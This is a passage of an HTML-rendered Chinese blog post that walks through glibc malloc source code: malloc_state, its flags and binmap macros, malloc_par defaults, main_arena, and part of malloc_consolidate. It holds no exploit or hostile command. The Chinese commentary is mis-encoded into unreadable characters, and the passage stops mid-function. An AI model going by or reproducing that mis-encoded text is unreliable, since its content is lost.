çš„å¤´èŠ‚ç‚¹</strong>ã€‚</p></li><li><p>large binç»“æ„:</p></li></ul><p><img src="../../image/glibc_malloc_srcCode/KHlB5YwzDnq1pmZ.png" alt="large-bin"> </p></li></ul><h3 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Top</span><br><span class="hljs-comment">    The top-most available chunk (i.e., the one bordering the end of</span><br><span class="hljs-comment">    available memory) is treated specially. It is never included in</span><br><span class="hljs-comment">    any bin, is used only if no other chunk is available, and is</span><br><span class="hljs-comment">    released back to the system if it is very large (see</span><br><span class="hljs-comment">    M_TRIM_THRESHOLD).  Because top initially</span><br><span class="hljs-comment">    points to its own bin with initial zero size, thus forcing</span><br><span class="hljs-comment">    extension on the first malloc request, we avoid having any special</span><br><span class="hljs-comment">    code in malloc to check whether it even exists yet. But we still</span><br><span class="hljs-comment">    need to do so when getting memory from system, so we make</span><br><span class="hljs-comment">    initial_top treat the bin as a legal but unusable chunk during the</span><br><span class="hljs-comment">    interval between initialization and the first call to</span><br><span class="hljs-comment">    sysmalloc. (This is somewhat delicate, since it relies on</span><br><span class="hljs-comment">    the 2 preceding words to be zero during this interval as well.)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span><br></code></pre></div></td></tr></table></figure><h3 id="æ€»çš„index"><a href="#æ€»çš„index" class="headerlink" title="æ€»çš„index"></a>æ€»çš„index</h3><pre><code class=" mermaid">graph LRg([bin_index])--&gt;a(smallbin_index) &amp; b(largebin_index)b--&gt;|64|largebin_index_64b--&gt;|32 &amp; MALLOC_ALIGNMENT == 16|m[largebin_index_32_big]b--&gt;|32 &amp; != 16|largebin_index_32</code></pre><h2 id="æ ¸å¿ƒç»“æ„ä½“"><a href="#æ ¸å¿ƒç»“æ„ä½“" class="headerlink" title="æ ¸å¿ƒç»“æ„ä½“"></a>æ ¸å¿ƒç»“æ„ä½“</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-keyword">int</span> flags;<br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-keyword">int</span> have_fastchunks;   <span class="hljs-comment">//have_fastchunksæ˜¯glibc 2.27 åŠä»¥åç‰¹æœ‰çš„, å››å­—èŠ‚32ä½å¯ç”¨</span><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> binmap[BINMAPSIZE];<br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p><strong>flags</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment">   upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment">   initialization checks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> have_fastchunks(M)     (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br></code></pre></div></td></tr></table></figure><p><strong>Binmap</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Binmap</span><br><span class="hljs-comment">    To help compensate for the large number of bins, a one-level index</span><br><span class="hljs-comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span><br><span class="hljs-comment">    bitvector recording whether bins are definitely empty so they can</span><br><span class="hljs-comment">    be skipped over during during traversals.  The bits are NOT always</span><br><span class="hljs-comment">    cleared as soon as bins are empty, but instead only</span><br><span class="hljs-comment">    when they are noticed to be empty during traversal in malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSHIFT      5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)<span class="hljs-comment">//32 bits per map word,every bit is useful</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)<span class="hljs-comment">//ç¬¬6ä½åŠä»¥åç¡®å®šblock</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))<span class="hljs-comment">//i &amp; 31:å–å‡ºä½5ä½å†³å®šåœ¨blockä¸­çš„bit</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span><br></code></pre></div></td></tr></table></figure><h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> //<span class="hljs-title">malloc</span> <span class="hljs-title">parameter</span>, å †ç®¡ç†å™¨çš„ç›¸å…³å‚æ•°</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Tunable parameters */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> trim_threshold;<br>  INTERNAL_SIZE_T top_pad;<br>  INTERNAL_SIZE_T mmap_threshold;<br>  INTERNAL_SIZE_T arena_test;<br>  INTERNAL_SIZE_T arena_max;<br><br>  <span class="hljs-comment">/* Memory map support */</span><br>  <span class="hljs-keyword">int</span> n_mmaps;<br>  <span class="hljs-keyword">int</span> n_mmaps_max;<br>  <span class="hljs-keyword">int</span> max_n_mmaps;<br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment">     it manually, at which point we need to disable any</span><br><span class="hljs-comment">     dynamic behavior. */</span><br>  <span class="hljs-keyword">int</span> no_dyn_threshold;<br><br>  <span class="hljs-comment">/* Statistics */</span><br>  INTERNAL_SIZE_T mmapped_mem;<br>  INTERNAL_SIZE_T max_mmapped_mem;<br><br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span><br>  <span class="hljs-keyword">char</span> *sbrk_base;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_bins;<br>  <span class="hljs-keyword">size_t</span> tcache_max_bytes;<br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_count;<br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which</span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_limit;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>å½“æ¯ä¸ªåˆ†é…åŒºçš„ top chunk å¤§å°å¤§äº<strong>trim_threshold</strong>æ—¶ï¼Œåœ¨ä¸€å®šçš„æ¡ä»¶ä¸‹ï¼Œè°ƒç”¨ free æ—¶ä¼šæ”¶ç¼©å†…å­˜ï¼Œå‡å° top chunk çš„å¤§å°ã€‚</li><li><strong>top_pad</strong> å­—æ®µè¡¨ç¤ºåœ¨åˆ†é…å†…å­˜æ—¶æ˜¯å¦æ·»åŠ é¢å¤–çš„ padï¼Œé»˜è®¤è¯¥å­—æ®µä¸º 0ã€‚ </li><li><strong>mmap_threshold</strong> å­—æ®µè¡¨ç¤º mmap åˆ†é…é˜ˆå€¼ï¼Œé»˜è®¤å€¼ä¸º 128KBï¼Œåœ¨ 32 ä½ç³»ç»Ÿä¸Šæœ€å¤§å€¼ä¸º 512KBï¼Œ64 ä½ç³»ç»Ÿä¸Šçš„æœ€å¤§å€¼ä¸º 32MBï¼Œç”±äºé»˜è®¤å¼€å¯ mmap åˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´ï¼Œè¯¥å­—æ®µçš„ å€¼ä¼šåŠ¨æ€ä¿®æ”¹ï¼Œä½†ä¸ä¼šè¶…è¿‡æœ€å¤§å€¼ã€‚ </li><li><strong>arena_test</strong> å’Œ <strong>arena_max</strong> ç”¨äº PER_THREAD ä¼˜åŒ–ï¼Œåœ¨ 32 ä½ç³»ç»Ÿä¸Š arena_test é»˜è®¤å€¼ä¸º 2ï¼Œ 64 ä½ç³»ç»Ÿä¸Šçš„é»˜è®¤å€¼ä¸º 8ï¼Œå½“æ¯ä¸ªè¿›ç¨‹çš„åˆ†é…åŒºæ•°é‡å°äºç­‰äº arena_test æ—¶ï¼Œä¸ä¼šé‡ç”¨å·²æœ‰ çš„åˆ†é…åŒºã€‚ä¸ºäº†é™åˆ¶åˆ†é…åŒºçš„æ€»æ•°ï¼Œç”¨ arena_max æ¥ä¿å­˜åˆ†é…åŒºçš„æœ€å¤§æ•°é‡ï¼Œå½“ç³»ç»Ÿä¸­çš„åˆ† é…åŒºæ•°é‡è¾¾åˆ° arena_maxï¼Œå°±ä¸ä¼šå†åˆ›å»ºæ–°çš„åˆ†é…åŒºï¼Œåªä¼šé‡ç”¨å·²æœ‰çš„åˆ†é…åŒºã€‚è¿™ä¸¤ä¸ªå­—æ®µ éƒ½å¯ä»¥ä½¿ç”¨ mallopt()å‡½æ•°è®¾ç½®ã€‚ </li><li><strong>n_mmaps</strong> å­—æ®µè¡¨ç¤ºå½“å‰è¿›ç¨‹ä½¿ç”¨ mmap()å‡½æ•°åˆ†é…çš„å†…å­˜å—çš„ä¸ªæ•°ã€‚ </li><li><strong>n_mmaps_max</strong> å­—æ®µè¡¨ç¤ºè¿›ç¨‹ä½¿ç”¨ mmap()å‡½æ•°åˆ†é…çš„å†…å­˜å—çš„æœ€å¤§æ•°é‡ï¼Œé»˜è®¤å€¼ä¸º65536ï¼Œå¯ä»¥ä½¿ç”¨ mallopt()å‡½æ•°ä¿®æ”¹</li><li><strong>max_n_mmaps</strong> å­—æ®µè¡¨ç¤ºå½“å‰è¿›ç¨‹ä½¿ç”¨ mmap()å‡½æ•°åˆ†é…çš„å†…å­˜å—çš„æ•°é‡çš„æœ€å¤§å€¼ï¼Œæœ‰å…³ç³» n_mmaps &lt;= max_n_mmaps æˆç«‹ã€‚è¿™ä¸ªå­—æ®µæ˜¯ç”±äº mstats()å‡½æ•°è¾“å‡ºç»Ÿè®¡éœ€è¦è¿™ä¸ªå­—æ®µã€‚ </li><li><strong>no_dyn_threshold</strong> å­—æ®µè¡¨ç¤ºæ˜¯å¦å¼€å¯ mmap åˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´æœºåˆ¶ï¼Œé»˜è®¤å€¼ä¸º 0ï¼Œä¹Ÿå°± æ˜¯é»˜è®¤å¼€å¯ mmap åˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´æœºåˆ¶ã€‚ </li><li><strong>pagesize</strong> å­—æ®µè¡¨ç¤ºç³»ç»Ÿçš„é¡µå¤§å°ï¼Œé»˜è®¤ä¸º 4KBã€‚ </li><li><strong>mmapped_mem</strong> å’Œ <strong>max_mmapped_mem</strong> éƒ½ç”¨äºç»Ÿè®¡ mmap åˆ†é…çš„å†…å­˜å¤§å°ï¼Œä¸€èˆ¬æƒ…å†µ ä¸‹ä¸¤ä¸ªå­—æ®µçš„å€¼ç›¸ç­‰ï¼Œmax_mmapped_mem ç”¨äº mstats()å‡½æ•°ã€‚ </li><li><strong>max_total_mem</strong> å­—æ®µåœ¨å•çº¿ç¨‹æƒ…å†µä¸‹ç”¨äºç»Ÿè®¡è¿›ç¨‹åˆ†é…çš„å†…å­˜æ€»æ•°ã€‚ </li><li><strong>sbrk_base</strong> å­—æ®µè¡¨ç¤ºå †çš„èµ·å§‹åœ°å€ã€‚</li></ul><h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span> <span class="hljs-comment">//main_arenaæ˜¯ä¸€ä¸ªé‡Œlibcä¸­çš„å…¨å±€é™æ€å˜é‡</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="mp"><a href="#mp" class="headerlink" title="mp_"></a>mp_</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* There is only one instance of the malloc parameters.  */</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span><br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  ,<br>  .tcache_count = TCACHE_FILL_COUNT,<br>  .tcache_bins = TCACHE_MAX_BINS,<br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="hljs-number">-1</span>),<br>  .tcache_unsorted_limit = <span class="hljs-number">0</span> <span class="hljs-comment">/* No limit.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>è®¾ç½®äº†<code>top_pad</code>ä¸º 0</li><li>è®¾ç½®äº†<code>n_maps_max</code>ä¸º 65535</li><li>è®¾ç½®äº†<code>mmap_threshold</code>ä¸º 128 * 1024</li><li>è®¾ç½®äº†<code>trim_threshold</code>ä¸º 128 * 1024</li><li>è®¾ç½®äº†<code>arena_test</code>åœ¨gccä¸­32ä¸‹ä¸º2ï¼Œ64ä½ä¸‹ä¸º8ï¼ˆä¸åŒçš„ç¼–è¯‘å™¨ä¸­longçš„é•¿åº¦å¯èƒ½ä¸åŒï¼Œè¿™é‡Œä»…ä»¥gccä¸ºä¾‹ï¼‰</li></ul><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a><span id="malloc_consolidate"><strong>malloc_consolidate</strong></span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  ------------------------- malloc_consolidate -------------------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  malloc_consolidate is a specialized version of free() that tears</span><br><span class="hljs-comment">  down chunks held in fastbins.  Free itself cannot be used for this</span><br><span class="hljs-comment">  purpose since, among other things, it might place chunks back onto</span><br><span class="hljs-comment">  fastbins.  So, instead, we need to use a minor variant of the same</span><br><span class="hljs-comment">  code.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Also, because this routine needs to be called the first time through</span><br><span class="hljs-comment">  malloc anyway, it turns out to be the perfect place to trigger</span><br><span class="hljs-comment">  initialization code.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">malloc_consolidate</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-keyword">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If max_fast is 0, we know that av hasn&#x27;t</span><br><span class="hljs-comment">      yet been initialized, in which case do so below</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// è¯´æ˜ fastbin å·²ç»åˆå§‹åŒ–</span><br>    <span class="hljs-keyword">if</span> (get_max_fast() != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// æ¸…ç©º fastbin æ ‡è®°</span><br>        <span class="hljs-comment">// å› ä¸ºè¦åˆå¹¶ fastbin ä¸­çš„ chunk äº†ã€‚</span><br>        clear_fastchunks(av);<br>        <span class="hljs-comment">//</span><br>        unsorted_bin = unsorted_chunks(av);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">          then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">          placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">          until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">          reused anyway.</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">// æŒ‰ç…§ fd é¡ºåºéå† fastbin çš„æ¯ä¸€ä¸ª binï¼Œå°† bin ä¸­çš„æ¯ä¸€ä¸ª chunk åˆå¹¶æ‰ã€‚</span><br>        maxfb = &amp;fastbin(av, NFASTBINS - <span class="hljs-number">1</span>);<br>        fb    = &amp;fastbin(av, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">do</span> &#123;<br>            p = atomic_exchange_acq(fb, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    check_inuse_chunk(av, p);<br>                    nextp = p-&gt;fd;<br><br>                    <span class="hljs-comment">/* Slightly streamlined version of consolidation code in</span><br><span class="hljs-comment">                     * free() */</span><br>                    size      = chunksize(p);<br>                    nextchunk = chunk_at_offset(p, size);<br>                    nextsize  = chunksize(nextchunk);<br><br>                    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<span class="hljs-comment">//pçš„å‰ä¸€å—ç©ºé—²é©¬ä¸Šå–å‡º, è®¡ç®—åˆå¹¶åå¤§å°</span><br>                        prevsize = prev_size(p);<br>                        size += prevsize;<br>                        p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>                        unlink(av, p, bck, fwd);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123; <br>                        <span class="hljs-comment">// åˆ¤æ–­ nextchunk æ˜¯å¦æ˜¯ç©ºé—²çš„ã€‚</span><br>                        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                        <span class="hljs-keyword">if</span> (!nextinuse) &#123; <span class="hljs-comment">//pçš„åä¸€å—ç©ºé—²é©¬ä¸Šå–å‡º, è®¡ç®—åˆå¹¶åå¤§å°</span><br>                            size += nextsize;<br>                            unlink(av, nextchunk, bck, fwd);<br>                        &#125; <span class="hljs-keyword">else</span><br>                         <span class="hljs-comment">// è®¾ç½® nextchunk çš„ prev inuse ä¸º0ï¼Œä»¥è¡¨æ˜å¯ä»¥åˆå¹¶å½“å‰ fast chunkã€‚</span><br>                            clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>                        <br>                        <span class="hljs-comment">//æ’å…¥unsorted binçš„å¸¸è§„æ“ä½œ</span><br>                        